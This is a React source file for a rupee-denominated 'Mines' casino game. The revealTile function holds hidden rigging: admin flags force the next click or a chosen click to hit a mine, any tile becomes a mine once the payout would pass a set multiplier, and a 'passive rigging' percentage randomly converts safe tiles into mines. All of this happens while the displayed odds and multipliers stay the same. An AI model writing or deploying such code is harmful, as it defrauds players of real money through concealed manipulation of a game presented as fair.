import { useState, useCallback, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Bomb, Gem, Coins, RotateCcw, Play, Wallet, ShieldAlert, ChevronDown } from 'lucide-react';
import toast from 'react-hot-toast';

const MinesGame = ({ onBet, onWin, onLoss, isMuted, settings }) => {
    const [betAmount, setBetAmount] = useState(0);
    const [mineCount, setMineCount] = useState(3);
    const [gameState, setGameState] = useState('idle'); // idle, playing, over
    const [grid, setGrid] = useState(Array(25).fill(null));
    const [mines, setMines] = useState([]);
    const [revealed, setRevealed] = useState([]);
    const [payout, setPayout] = useState(0);
    const houseEdge = (settings?.houseEdge || 1) / 100;
    const probabilityBias = (settings?.minesProbBias || 0) / 100;

    // Pre-load sounds for instant playback
    const [audioObjects] = useState({
        click: new Audio('https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3'),
        win: new Audio('https://assets.mixkit.co/active_storage/sfx/2013/2013-preview.mp3'),
        loss: new Audio('https://assets.mixkit.co/active_storage/sfx/2018/2018-preview.mp3'),
        reveal: new Audio('https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3'),
        gem: new Audio('https://assets.mixkit.co/active_storage/sfx/600/600-preview.mp3') // Satisfying chime sound
    });

    const playSound = (type) => {
        if (isMuted) return;
        try {
            const sound = audioObjects[type];
            if (sound) {
                sound.currentTime = 0;
                sound.volume = 0.5;
                sound.play().catch(() => {
                    // Fallback for browsers that block auto-play or if URL fails
                    const tempAudio = new Audio(sound.src);
                    tempAudio.volume = 0.5;
                    tempAudio.play().catch(() => { });
                });
            }
        } catch (e) {
            console.error("Audio play error", e);
        }
    };

    // Calculate multiplier based on revealed tiles and mines
    const calculateMultiplier = (revealedCount) => {
        if (revealedCount === 0) return 0;
        let probability = 1.0;
        for (let i = 0; i < revealedCount; i++) {
            probability *= (25 - mineCount - i) / (25 - i);
        }
        const multiplier = (1 / probability) * (1 - houseEdge);
        return multiplier.toFixed(2);
    };

    const startGame = async () => {
        if (gameState === 'playing') return;
        if (betAmount <= 0) {
            toast.error('Please enter a valid bet amount');
            return;
        }
        const success = await onBet(betAmount);
        if (!success) return;

        playSound('click');
        const minePositions = [];
        while (minePositions.length < mineCount) {
            const pos = Math.floor(Math.random() * 25);
            if (!minePositions.includes(pos)) {
                minePositions.push(pos);
            }
        }

        setMines(minePositions);
        setGrid(Array(25).fill(null));
        setRevealed([]);
        setGameState('playing');
        setPayout(0);
    };

    const revealTile = (index) => {
        if (gameState !== 'playing' || revealed.includes(index)) return;

        // --- Precision Control & Difficulty Bias ---
        let finalIsMine = mines.includes(index);

        // 1. Forced Trapping (Manual Admin Control)
        if (settings?.trapNextMine) {
            finalIsMine = true;
            if (!mines.includes(index)) {
                setMines(prev => [...prev, index]);
            }
            // Reset trap after one use
            import('../../firebase').then(({ db }) => {
                import('firebase/firestore').then(({ doc, updateDoc }) => {
                    updateDoc(doc(db, 'settings', 'casino'), { trapNextMine: false });
                });
            });
        } else if (settings?.trapAtClick > 0 && revealed.length + 1 === settings.trapAtClick) {
            // Trap exactly on the configured click number
            finalIsMine = true;
            if (!mines.includes(index)) {
                setMines(prev => [...prev, index]);
            }
        }

        // Auto max limit check (Prevent winning more than X)
        if (!finalIsMine && settings?.autoMaxMinesMultiplier > 0) {
            const nextMultiplier = calculateMultiplier(revealed.length + 1);
            if (nextMultiplier > settings.autoMaxMinesMultiplier) {
                finalIsMine = true;
                if (!mines.includes(index)) {
                    setMines(prev => [...prev, index]);
                }
            }
        }
        // 2. Probability Bias (Passive Rigging)
        else if (settings?.minesProbBias > 0) {
            const rigChance = settings.minesProbBias / 100;
            if (Math.random() < rigChance) {
                finalIsMine = true;
                if (!mines.includes(index)) {
                    setMines(prev => [...prev, index]);
                }
            }
        }

        const newRevealed = [...revealed, index];
        setRevealed(newRevealed);

        if (finalIsMine) {
            setGameState('over');
            setPayout(0);
            onLoss(betAmount);
            playSound('loss');
            toast.error('KABOOM! You hit a mine.', { icon: '💥' });
        } else {
            // Trigger sound immediately for each tile
            playSound('reveal');

            const multiplier = calculateMultiplier(newRevealed.length);
            setPayout((betAmount * multiplier).toFixed(2));

            if (newRevealed.length === 25 - mineCount) {
                cashOut(newRevealed);
            }
        }
    };

    const cashOut = async (finalRevealed = revealed) => {
        if (gameState !== 'playing' || finalRevealed.length === 0) return;
        const multiplier = calculateMultiplier(finalRevealed.length);
        const winAmount = Math.floor(betAmount * multiplier);
        setGameState('over');
        await onWin(winAmount);
        playSound('win');
        toast.success(`Cashed out at ${multiplier}x!`);
    };

    const currentMultiplier = calculateMultiplier(revealed.length);

    return (
        <div className="flex flex-col lg:flex-row bg-[#0f212e] overflow-hidden min-h-[600px]">
            {/* Sidebar Controls */}
            <div className="w-full lg:w-[310px] bg-[#213743] p-4 flex flex-col gap-4 z-10 border-r border-[#0f212e]">
                <div className="space-y-1.5">
                    <div className="flex justify-between items-center text-[#b1bad3] text-[12px] font-bold uppercase tracking-wider px-1">
                        <span>Bet Amount</span>
                        <span>₹{betAmount.toLocaleString()}</span>
                    </div>
                    <div className="flex bg-[#0f212e] border-2 border-[#2f4553] rounded-[10px] overflow-hidden hover:border-[#557086] transition-all h-[44px]">
                        <input
                            type="number"
                            value={betAmount === 0 ? '' : betAmount}
                            onChange={(e) => setBetAmount(Math.max(0, parseFloat(e.target.value) || 0))}
                            disabled={gameState === 'playing'}
                            placeholder="0.00"
                            className="flex-1 bg-transparent px-3 text-white font-black outline-none text-[15px] placeholder:text-[#557086]"
                        />
                        <div className="flex items-center px-1">
                            <div className="w-4 h-4 rounded-full bg-yellow-500 flex items-center justify-center text-[10px] font-black text-black">₹</div>
                        </div>
                        <div className="flex bg-[#2f4553] ml-2">
                            <button onClick={() => setBetAmount(prev => parseFloat((prev / 2).toFixed(2)))} disabled={gameState === 'playing'} className="px-3 text-white font-bold hover:bg-[#3b5568] transition-colors border-r border-[#0f212e] text-xs">1/2</button>
                            <button onClick={() => setBetAmount(prev => parseFloat((prev * 2).toFixed(2)))} disabled={gameState === 'playing'} className="px-3 text-white font-bold hover:bg-[#3b5568] transition-colors text-xs">2x</button>
                        </div>
                    </div>
                </div>

                <div className="space-y-1.5">
                    <div className="text-[#b1bad3] text-[12px] font-bold uppercase tracking-wider px-1">Mines</div>
                    <div className="relative group cursor-pointer">
                        <select
                            value={mineCount}
                            onChange={(e) => setMineCount(parseInt(e.target.value))}
                            disabled={gameState === 'playing'}
                            className="w-full bg-[#0f212e] border-2 border-[#2f4553] rounded-[10px] py-2.5 px-3 text-white font-black outline-none appearance-none group-hover:border-[#557086] transition-all text-sm cursor-pointer pr-10"
                        >
                            {[...Array(24)].map((_, i) => (<option key={i + 1} value={i + 1} className="bg-[#0f212e]">{i + 1}</option>))}
                        </select>
                        <ChevronDown size={18} className="absolute right-3 top-1/2 -translate-y-1/2 text-[#b1bad3] pointer-events-none" />
                    </div>
                </div>

                <div className="mt-2">
                    {gameState === 'playing' ? (
                        <button onClick={() => cashOut()} className="w-full py-3.5 bg-[#00e701] hover:bg-[#2fff30] text-black rounded-[10px] font-black text-[15px] shadow-[0_4px_0_rgb(0,180,1)] active:translate-y-0.5 active:shadow-none transition-all flex flex-col items-center leading-none gap-0.5">
                            <span className="text-[13px]">Cashout</span>
                            {revealed.length > 0 && <span className="text-[11px] opacity-70">₹{payout}</span>}
                        </button>
                    ) : (
                        <button onClick={startGame} className="w-full py-3.5 bg-[#00e701] hover:bg-[#2fff30] text-black rounded-[10px] font-black text-[15px] shadow-[0_4px_0_rgb(0,180,1)] active:translate-y-0.5 active:shadow-none transition-all">Bet</button>
                    )}
                </div>
            </div>

            <div className="flex-1 bg-[#0f212e] p-4 sm:p-12 flex items-center justify-center relative min-h-[500px]">
                <div className="grid grid-cols-5 gap-2.5 sm:gap-4 w-full max-w-[500px] aspect-square">
                    {grid.map((tile, i) => {
                        const isRevealed = revealed.includes(i);
                        const isMine = mines.includes(i);
                        const isOver = gameState === 'over';
                        return (
                            <button
                                key={i}
                                onClick={() => revealTile(i)}
                                disabled={isRevealed || isOver}
                                className={`group relative rounded-[10px] sm:rounded-[10px] transition-all duration-75 aspect-square flex items-center justify-center
                                    ${isRevealed
                                        ? isMine ? 'bg-[#1a2c38]' : 'bg-[#0f212e] ring-2 ring-[#102c38]'
                                        : isOver
                                            ? isMine ? 'bg-[#1a2c38] opacity-60' : 'bg-[#213743] opacity-30'
                                            : 'bg-[#213743] hover:bg-[#2f4553] hover:-translate-y-0.5 shadow-[0_4px_0_rgb(13,28,39)] hover:shadow-[0_4px_0_rgb(33,55,67)] active:translate-y-0.5 active:shadow-none'
                                    }
                                `}
                            >
                                <AnimatePresence mode="wait">
                                    {(isRevealed || (isOver && isMine)) && (
                                        <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} className="w-[75%] h-[75%] flex items-center justify-center">
                                            {isMine ? (
                                                <div className={`w-[85%] h-[85%] rounded-full flex items-center justify-center ${isRevealed ? 'bg-[#ef4444] shadow-[0_0_20px_rgba(239,68,68,0.4)]' : ''}`}>
                                                    <Bomb size={24} className={isRevealed ? 'text-black' : 'text-[#ef4444] opacity-30'} fill="currentColor" />
                                                </div>
                                            ) : (
                                                <motion.div initial={{ scale: 0, rotate: -45 }} animate={{ scale: 1, rotate: 0 }} className="text-[#00e701] drop-shadow-[0_0_12px_rgba(0,231,1,0.5)]">
                                                    <Gem size={42} fill="currentColor" />
                                                </motion.div>
                                            )}
                                        </motion.div>
                                    )}
                                </AnimatePresence>
                            </button>
                        );
                    })}
                </div>

                <AnimatePresence>
                    {gameState === 'over' && payout > 0 && (
                        <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.9 }} className="absolute z-20 pointer-events-none">
                            <div className="bg-[#0f212e]/95 border-[4px] border-[#00e701] rounded-[10px] w-[200px] aspect-square flex flex-col items-center justify-center shadow-[0_0_50px_rgba(0,0,0,0.5)] backdrop-blur-md">
                                <div className="text-[#00e701] text-[34px] font-black tracking-tight leading-none mb-4">{currentMultiplier}x</div>
                                <div className="h-[2px] bg-[#2f4553] w-[140px] mb-5" />
                                <div className="flex items-center gap-2 text-white font-black text-2xl">
                                    <span className="text-zinc-400">₹</span>
                                    <span>{(betAmount * currentMultiplier).toFixed(2)}</span>
                                    <div className="w-5 h-5 rounded-full bg-yellow-500 flex items-center justify-center text-[11px] font-black text-black">₹</div>
                                </div>
                            </div>
                        </motion.div>
                    )}
                </AnimatePresence>
            </div>
        </div>
    );
};

export default MinesGame;
